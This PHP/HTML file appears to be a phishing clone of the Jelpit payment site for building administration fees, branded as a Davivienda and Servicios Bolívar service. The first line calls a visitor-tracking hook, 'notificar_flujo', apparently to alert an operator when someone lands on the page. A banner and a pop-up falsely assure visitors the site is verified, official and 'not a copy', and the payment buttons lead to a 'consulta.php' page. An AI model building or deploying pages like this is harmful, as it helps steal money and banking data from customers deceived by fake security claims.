<?php require_once __DIR__ . "/includes/flujo.php"; notificar_flujo("👤 Entrada Principal"); ?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jelpit | Pagos en Línea de Administración</title>
    <meta name="description" content="Paga administración y servicios en línea con Jelpit. Plataforma segura, ágil y adaptada a móvil.">
    <meta name="robots" content="index,follow,max-image-preview:large">
    <link rel="canonical" href="/">
    <link rel="icon" type="image/x-icon" href="/img/favicon.svg">
    <link rel="apple-touch-icon" href="/img/favicon.svg">
    <meta property="og:type" content="website">
    <meta property="og:title" content="Jelpit | Pagos en Línea de Administración">
    <meta property="og:description" content="Paga en línea con Jelpit de manera rápida y segura.">
    <meta property="og:url" content="/">
    <meta property="og:site_name" content="Jelpit">
    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Organization",
      "name": "Jelpit",
      "url": "/"
    }
    </script>
    <style>
        /* Reset de estilos básicos */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        /* --- MODAL EMERGENTE DE SITIO SEGURO --- */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-color: rgba(0, 0, 0, 0.6);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            padding: 20px;
        }

        .modal-content {
    background-color: #ffffff;
    border-radius: 8px;
    padding: 47px 42px;
    max-width: 501px;
    width: 100%;
    text-align: center;
    position: relative;
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
}

        .modal-close {
            position: absolute;
            top: 15px;
            right: 20px;
            background: transparent;
            border: none;
            font-size: 24px;
            color: #2D165E;
            cursor: pointer;
            font-weight: bold;
        }

        .modal-icon {
            width: 85px;
            height: auto;
            margin-bottom: 15px;
        }

        .modal-title {
            color: #4B1E8A;
            font-size: 14px;
            font-weight: 800;
            margin-bottom: 15px;
        }

        .modal-text {
            color: #666666;
            font-size: 13px;
            font-weight: 500;
            line-height: 1.5;
            margin-bottom: 30px;
            padding: 0 10px;
        }

        .modal-btn {
            background-color: #83DD7A;
            color: #2D165E;
            border: none;
            border-radius: 999px;
            padding: 14px 45px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: background-color 0.2s ease-in-out;
        }

        .modal-btn:hover {
            background-color: #71cf68;
        }

        /* --- BANNER DE VERIFICACIÓN --- */
        .secure-banner {
            width: 100%;
            background-color: #8EDC7B;
            color: #2D165E;
            display: flex;
            justify-content: center;
            border-bottom: 2px solid rgba(45, 22, 94, 0.08);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            -webkit-font-smoothing: antialiased;
            text-rendering: optimizeLegibility;
        }

        .secure-banner-content {
            width: 100%;
            max-width: 1784px;
            height: 82px;
            padding: 0 22px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 288px;
            position: relative;
        }

        .secure-banner-info {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            flex: 0 1 auto;
            margin: 0;
        }

        .secure-banner-text {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            line-height: 1.1;
            gap: 2px;
        }

        .secure-banner-title {
            font-size: 13px;
            font-weight: 800;
            letter-spacing: 0.1px;
        }

        .secure-banner-subtitle {
            font-size: 10px;
            font-weight: 600;
            letter-spacing: 0.05px;
        }

        .secure-banner-btn {
            background-color: #3A117E;
            color: #fff;
            border: none;
            border-radius: 999px;
            padding: 10px 30px;
            font-size: 15px;
            font-weight: 700;
            text-decoration: none;
            white-space: nowrap;
            margin-left: 12px;
        }

        .secure-banner-close {
    background: transparent;
    border: none;
    color: #2D165E;
    font-size: 24px;
    font-weight: 700;
    line-height: 1;
    cursor: pointer;
    padding: 0;
    margin-left: 0;
    position: absolute;
    right: 22px;
    top: 50%;
    transform: translateY(-50%);
}

        .secure-lock {
            width: 34px;
            height: 34px;
            flex-shrink: 0;
        }

        /* --- HEADER --- */
        .header-container {
            width: 100%;
            background-color: #2D165E;
            display: flex;
            justify-content: center;
            position: sticky;
            top: 0;
            z-index: 1000;
        }

        .header-content {
            width: 100%;
            max-width: 1788px;
            height: 81px;
            padding: 0 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo-section img { height: 60px; display: block; }
        .actions-section { display: flex; align-items: center; gap: 20px; }
        .mobile-menu-icon { display: none; color: white; cursor: pointer; }

        /* Botones del Header PC */
        .btn-pill { background-color: #D9F9D3; color: #2D165E; padding: 10px 19px; border-radius: 50px; border: none; font-weight: 400; font-size: 14px; display: flex; align-items: center; gap: 12px; cursor: pointer; text-decoration: none; }
        .btn-box { background-color: #baf2b5; color: #2D165E; width: 82px; height: 60px; border-radius: 4px; border: none; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; text-align: center; text-decoration: none; }
        .btn-box .icon-circle { border: 1.5px solid #2D165E; border-radius: 50%; width: 18px; height: 18px; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: bold; margin-bottom: 4px; }
        .btn-box span.text { font-size: 7px; font-weight: 550; text-transform: uppercase; line-height: 1.1; }
        .btn-login { background: none; border: none; color: white; display: flex; flex-direction: column; align-items: center; cursor: pointer; margin-left: 10px; text-decoration: none; }
        .btn-login svg { width: 20px; height: 20px; margin-bottom: 3px; }
        .btn-login span { font-size: 12px; font-weight: 500; }

        /* --- BOTÓN FLOTANTE MÓVIL --- */
        .btn-floating-mobile {
            display: none;
            position: fixed;
            right: 0;
            top: 40%;
            background-color: #baf2b5;
            color: #2D165E;
            width: 88px;
            height: 85px;
            border-radius: 8px 0 0 8px;
            z-index: 9999;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            text-decoration: none;
            box-shadow: -2px 4px 12px rgba(0,0,0,0.25);
        }

        /* --- BANNER PRINCIPAL --- */
        .hero-full-width { width: 100%; overflow: hidden; background-color: #fff; position: relative; }
        .hero-full-width img { width: 100%; height: auto; display: block; object-fit: cover; }

        /* --- SERVICIOS --- */
        .services-section { width: 100%; max-width: 1200px; margin: 40px auto; padding: 0 20px; text-align: center; }
        .services-title { color: #2D165E; font-size: 22px; font-weight: 700; margin-bottom: 30px; }
        .services-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; }
        .service-card { background: #fff; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.08); text-align: left; transition: 0.3s; }
        .service-card:hover { transform: translateY(-5px); }
        .service-card img { width: 100%; height: 180px; object-fit: cover; }
        .card-content { padding: 20px; }
        .card-content h3 { font-size: 16px; color: #000; margin-bottom: 8px; font-weight: 700; }
        .card-content p { font-size: 13px; color: #666; margin-bottom: 15px; min-height: 36px; }
        .card-link { color: #2D165E; text-decoration: none; font-weight: bold; font-size: 13px; }

        /* --- FOOTER --- */
        .footer-container { width: 100%; background-color: #2D165E; color: white; padding: 50px 0 20px 0; display: flex; justify-content: center; }
        .footer-content { width: 100%; max-width: 1788px; padding: 0 60px; }
        .footer-top { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 40px; }
        .footer-left { display: flex; gap: 20px; align-items: flex-start; width: 30%; }
        .vigilado-img { height: 100px; }
        .footer-center { width: 45%; }
        .footer-center h4 { font-size: 15px; margin-bottom: 12px; }
        .footer-center p { font-size: 13px; line-height: 1.6; color: #ddd; }
        .footer-socials { display: flex; gap: 15px; }
        .footer-socials svg { width: 28px; height: 28px; fill: white; }
        .footer-divider { border-top: 1px solid rgba(255,255,255,0.1); margin: 30px 0; }
        .footer-links { display: flex; justify-content: center; gap: 30px; margin-bottom: 20px; flex-wrap: wrap; }
        .footer-links a { color: white; text-decoration: none; font-size: 13px; font-weight: 600; }
        .footer-bottom-info { text-align: center; font-size: 11px; opacity: 0.7; }

        /* --- RESPONSIVO --- */
        @media (max-width: 768px) {
            .modal-content { padding: 40px 20px; }
            .modal-title { font-size: 18px; }
            .modal-text { font-size: 15px; }
            .modal-btn { padding: 12px 35px; font-size: 16px; }

            .secure-banner-content {
                height: auto;
                min-height: 114px;
                padding: 22px 16px 18px;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                gap: 14px;
            }

            .secure-banner-info {
                flex-direction: column;
                text-align: center;
                gap: 8px;
                margin: 0;
            }

            .secure-banner-title { font-size: 11px; }
            .secure-banner-subtitle { font-size: 11px; line-height: 1.3; }
            .secure-banner-btn { font-size: 10px; padding: 12px 34px; }
            .secure-banner-close { position: absolute; right: 15px; top: 19px; font-size: 19px; }
            .secure-lock { width: 40px; height: 40px; }

            .header-content { height: 70px; padding: 0 20px; }
            .actions-section { display: none; }
            .mobile-menu-icon { display: block; }
            .btn-floating-mobile { display: flex; }

            .services-grid { grid-template-columns: repeat(2, 1fr); gap: 15px; }
            .service-card img { height: 130px; }
            .card-content h3 { font-size: 14px; }
            .card-content p { font-size: 11px; }

            .footer-top { flex-direction: column; align-items: center; text-align: center; gap: 30px; }
            .footer-left, .footer-center { width: 100%; flex-direction: column; align-items: center; }
            .footer-links { flex-direction: column; gap: 15px; align-items: center; }
        }
    </style>
</head>
<body>

    <!-- MODAL DE SITIO OFICIAL JELPIT -->
    <div class="modal-overlay" id="welcomeModal">
        <div class="modal-content">
            <button class="modal-close" id="closeModalBtn" aria-label="Cerrar modal">✕</button>
            <img src="img/logo_anicial.svg" alt="Sitio Seguro Jelpit" class="modal-icon">
            <h2 class="modal-title">¡Estás en un sitio oficial de Jelpit!</h2>
            <p class="modal-text">Te encuentras en un entorno seguro, recuerda que en Jelpit no te pediremos códigos de confirmación por fuera de la plataforma.</p>
            <button class="modal-btn" id="continueBtn">Continuar</button>
        </div>
    </div>

    <!-- BANNER DE VERIFICACIÓN SUPERIOR -->
    <section class="secure-banner" id="secureBanner">
        <div class="secure-banner-content">
            <div class="secure-banner-info">
                <svg class="secure-lock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true">
                    <rect x="5" y="10" width="14" height="11" rx="3"></rect>
                    <path d="M8 10V7a4 4 0 1 1 8 0v3"></path>
                    <path d="M9.6 15.2l1.8 1.8 3.2-3.2"></path>
                </svg>
                <div class="secure-banner-text">
                    <strong class="secure-banner-title">Sitio seguro verificado - www.jelpit.com</strong>
                    <span class="secure-banner-subtitle">SSL válido | Empresa registrada | No es una copia</span>
                </div>
            </div>
            <a href="#" class="secure-banner-btn">Reportar copia</a>
            <button type="button" class="secure-banner-close" id="secureBannerClose" aria-label="Cerrar banner">X</button>
        </div>
    </section>

    <!-- HEADER -->
    <header class="header-container">
        <div class="header-content">
            <div class="logo-section"><img src="img/logo.svg" alt="Jelpit"></div>
            <div class="actions-section">
                <a href="#" class="btn-pill">Conjuntos <i class="arrow-down"></i></a>
                <a href="consulta.php" class="btn-box">
                    <div class="icon-circle">$</div>
                    <span class="text">Pagar<br>administración</span>
                </a>
                <a href="#" class="btn-login">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 21v-2a4 4 0 0 0-4-4H10a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
                    <span>Iniciar sesión</span>
                </a>
            </div>
            <div class="mobile-menu-icon">
                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
            </div>
        </div>
    </header>

    <!-- BOTÓN MÓVIL FLOTANTE -->
    <a href="consulta.php" class="btn-floating-mobile">
        <div class="icon-circle" style="border: 2px solid #2D165E; border-radius: 50%; width: 24px; height: 24px; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: bold; margin-bottom: 5px;">$</div>
        <span style="font-size: 10px; color: #2D165E; font-weight: bold; line-height: 1.1;">Pagar<br>administración</span>
    </a>

    <!-- IMAGEN BANNER -->
    <div class="hero-full-width">
        <picture>
            <source srcset="img/1.webp" media="(max-width: 768px)">
            <img src="img/2.webp" alt="Banner Jelpit">
        </picture>
    </div>

    <!-- SERVICIOS -->
    <section class="services-section">
        <h2 class="services-title">Nuestros Servicios</h2>
        <div class="services-grid">
            <div class="service-card">
                <img src="img/11.png" alt="S1">
                <div class="card-content">
                    <h3>Pagar administración</h3>
                    <p>Fácil, seguro y en casa.</p>
                    <a href="consulta.php" class="card-link">Pagar ahora ❯</a>
                </div>
            </div>
            <div class="service-card">
                <img src="img/22.png" alt="S2">
                <div class="card-content">
                    <h3>Crédito de Vivienda</h3>
                    <p>Te acompañamos en cada paso.</p>
                    <a href="#" class="card-link">Pedir mi crédito ❯</a>
                </div>
            </div>
            <div class="service-card">
                <img src="img/33.png" alt="S3">
                <div class="card-content">
                    <h3>Conciliar fácil?</h3>
                    <p>Logralo en menos de 15 min.</p>
                    <a href="#" class="card-link">Vincularme ❯</a>
                </div>
            </div>
            <div class="service-card">
                <img src="img/44.png" alt="S4">
                <div class="card-content">
                    <h3>Asistencias</h3>
                    <p>Beneficios GRATIS con tu tarjeta.</p>
                    <a href="#" class="card-link">Prográmalas ❯</a>
                </div>
            </div>
        </div>
    </section>

    <!-- FOOTER -->
    <footer class="footer-container">
        <div class="footer-content">
            <div class="footer-top">
                <div class="footer-left">
                    <img src="img/vigilado.svg" alt="Vigilado" class="vigilado-img">
                    <p>Servicio ofrecido por Banco Davivienda S.A. y operado por Servicios Bolívar S.A.</p>
                </div>
                <div class="footer-center">
                    <h4>¿Necesitas ayuda?</h4>
                    <p>Escríbenos a <a href="mailto:lineadesoporte923@serviciosbolivar.com" style="color:#D9F9D3;">lineadesoporte923@serviciosbolivar.com</a> o llámanos al <strong>#923</strong>.</p>
                </div>
                <div class="footer-socials">
                    <svg viewBox="0 0 24 24"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 4-8 4z"/></svg>
                    <svg viewBox="0 0 24 24"><path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"/></svg>
                </div>
            </div>
            <div class="footer-divider"></div>
            <div class="footer-links">
                <a href="#">Términos y condiciones</a>
                <a href="#">Privacidad</a>
                <a href="#">SIC</a>
            </div>
            <p class="footer-bottom-info">Jelpit 2026© - Todos los derechos reservados.</p>
        </div>
    </footer>

    <!-- SCRIPTS -->
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            // Lógica para cerrar el banner de verificación
            const bannerClose = document.getElementById('secureBannerClose');
            if(bannerClose) {
                bannerClose.addEventListener('click', function () {
                    document.getElementById('secureBanner').style.display = 'none';
                });
            }

            // Lógica del modal de Bienvenida/Seguridad
            const modal = document.getElementById('welcomeModal');
            const modalCloseBtn = document.getElementById('closeModalBtn');
            const continueBtn = document.getElementById('continueBtn');

            function closeModal() {
                modal.style.display = 'none';
            }

            if(modalCloseBtn) modalCloseBtn.addEventListener('click', closeModal);
            if(continueBtn) continueBtn.addEventListener('click', closeModal);
        });
    </script>

</body>
</html>